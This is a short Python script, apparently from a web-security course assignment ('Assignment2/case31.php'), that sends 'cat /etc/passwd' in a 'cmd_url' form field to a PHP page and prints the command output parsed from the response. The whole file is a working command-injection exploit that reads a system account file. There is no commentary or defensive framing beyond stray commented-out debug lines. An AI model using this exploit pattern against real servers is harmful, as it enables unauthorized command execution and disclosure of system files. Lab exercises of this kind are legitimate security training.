import requests
import re
url="http://www.wsb.com/Assignment2/case31.php"
payload={"cmd_url":"cat /etc/passwd"}
r=requests.post(url,data=payload)
re_result=re.findall('<pre>([\w\s\S:/,]*)</pre>',r.text)
#print(r.text)
#print(re_result)
#regex expression: \w \s : /
#print(r.text)
re_result=re_result[0].split('\n')
for data in re_result:
	if data=='':
		pass
	else:
		print(data)
